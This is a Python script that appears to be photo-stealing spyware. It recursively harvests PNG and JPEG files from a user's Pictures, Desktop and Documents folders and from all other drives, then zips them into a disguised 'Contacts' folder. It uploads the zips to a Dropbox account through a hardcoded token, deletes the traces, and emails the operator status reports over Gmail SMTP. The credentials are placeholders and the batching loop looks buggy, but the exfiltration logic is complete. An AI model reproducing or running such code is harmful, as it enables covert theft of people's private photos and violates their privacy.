import smtplib
import socket
import dropbox
from zipfile import ZipFile
import glob
import os
import datetime


def is_connected():
    try:
        socket.create_connection(("1.1.1.1", 53))
        return True
    except OSError:
        pass
    return False


def drives():
    return [chr(x) + ":" for x in range(65, 91) if os.path.exists(chr(x) + ":")]


def homedir():
    return os.path.expanduser("~")


def get_png(dr):
    return [f for f in glob.glob(f'{dr}/**/*.png', recursive=True)]


def zip_files():
    return [f for f in glob.glob(f'{homedir()}/Contacts/*.zip')]


def get_jpg(dr):
    return [f for f in glob.glob(f'{dr}/**/*.jpg', recursive=True)]


def get_jpeg(dr):
    return [f for f in glob.glob(f'{dr}/**/*.jpeg', recursive=True)]


def all_img():
    img = []

    for d in drives():
        if d[0].upper() == 'C':
            get_in_home(img)
        else:
            get_elsewhere(img, d)

    return img


def get_elsewhere(lst, drv):
    try:
        lst.extend(get_png(drv))
        lst.extend(get_jpg(drv))
        lst.extend(get_jpeg(drv))
    except Exception as e:
        notification(f"Error occurred with drives:\n\n{e}")
        pass


def get_in_home(lst):
    try:
        lst.extend(get_jpeg(f'{homedir()}/Pictures'))
        lst.extend(get_jpeg(f'{homedir()}/Desktop'))
        lst.extend(get_jpeg(f'{homedir()}/Documents'))
        lst.extend(get_jpg(f'{homedir()}/Pictures'))
        lst.extend(get_jpg(f'{homedir()}/Desktop'))
        lst.extend(get_jpg(f'{homedir()}/Documents'))
        lst.extend(get_png(f'{homedir()}/Pictures'))
        lst.extend(get_png(f'{homedir()}/Desktop'))
        lst.extend(get_png(f'{homedir()}/Documents'))
    except Exception as e:
        notification(f"Error occurred with Homedir:\n\n{e}")
        pass


def new_img_lst():
    global txt
    new_img = []
    with open('all.txt', 'r') as f:
        txt = [line.strip() for line in f.readlines()]

    for el in all_img():
        if el not in txt:
            new_img.append(el)

    append_all(new_img)
    notification(f"{len(new_img)} files found!")
    return new_img


def zip_img():
    img_lst = []
    img_lst.extend(new_img_lst())
    counter = 0
    pos_min = 0
    pos_max = 10
    itr = 0
    if 0 < len(img_lst) <= 10:
        with ZipFile(f'{homedir()}/Contacts/packet{str(datetime.datetime.now()).replace(":", "_")}.zip', 'w') as f:
            for el in img_lst:
                f.write(el)
    else:
        try:
            while itr < len(img_lst)//10:
                while counter < 10:
                    with ZipFile(f'{homedir()}/Contacts/packet{str(datetime.datetime.now()).replace(":", "_")}.zip', 'w') as file:
                        for i in range(pos_min, pos_max):
                            file.write(img_lst[i])
                            counter = counter+1
                            if counter == 9:
                                pos_min = pos_min + counter
                                pos_max = pos_max + pos_min
                                itr = itr+1
                                counter = 0
                                break
        except Exception as e:
            notification(f"Error occurred with zip function:\n\n{e}")
            pass


def append_all(lst):
    with open('all.txt', 'a') as file:
        file.write('\n'.join(lst) + "\n")


def push():
    files = []
    files.extend(zip_files())
    dbx = dropbox.Dropbox(tkn)

    if len(files) > 0:
        for file in files:
            with open(file, 'rb') as op:
                try:
                    dbx.files_upload(op.read(), f'/Photos/{op.name[op.name.index("packet"):]}')
                except Exception as e:
                    notification(f"Error occurred with dbx:\n\n{e}")
                    exit(0)
                else:
                    notification("NEW UPDATES MADE")


def rm_zip():
    for file in zip_files():
        os.remove(file)


def notification(msg):
    se = "email_address"
    pw = "email_password"
    server = smtplib.SMTP('smtp.gmail.com', 587)
    try:
        server.starttls()
        server.login(se, pw)
        server.sendmail(se, se, msg)
    except Exception as e:
        exit(0)


tkn = 'dropbox-token'

if __name__ == '__main__':
    if is_connected():
        notification("New thread started")
        rm_zip()
        zip_img()
        push()
        rm_zip()
    else:
        exit(0)
